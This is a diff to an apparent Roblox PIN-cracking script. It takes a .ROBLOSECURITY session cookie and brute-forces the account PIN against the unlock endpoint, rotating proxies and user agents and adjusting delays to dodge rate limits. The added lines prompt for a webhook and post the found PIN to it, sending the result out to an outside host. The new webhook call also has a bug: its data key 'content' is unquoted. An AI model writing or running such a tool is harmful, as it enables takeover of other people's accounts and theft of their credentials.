@@ -7774,7 +7774,10 @@ try:
   proxy = random.choice(proxies)
   headers = {}
   authurl = "https://auth.roblox.com/v2/logout"
-  cookie = input("Enter Your Cookie:")
+  cprint("Enter Your Cookie Below:", 'magenta')
+  cookie = input()
+  cprint("Enter Your Webhook Below:", 'magenta')
+  webhook = input()
   check = requests.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(cookie)}) #check if the cookie is valid  
   if check.status_code ==200:
     for char in 'Cracking the pin....':
@@ -7807,7 +7810,7 @@ try:
       "User-Agent": random.choice(userAgents)
       }
       time.sleep(waitTime)
-      time.sleep(1)
+      time.sleep(2)
       waitTime = 0
       response = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, proxies={"http":proxy}, data={'pin': pin}, cookies=cookies).json()
       cprint(response, 'blue')
@@ -7827,6 +7830,9 @@ try:
           break
       except KeyError:
         cprint(f"Pin found: {pin}", 'green')
+        r = requests.post(webhook, data={content:pin})
+        if not r.status_code ==200:
+          cprint('Invalid Webhook', 'red')
         break
   else:
     cprint("Invalid Cookie", 'red')
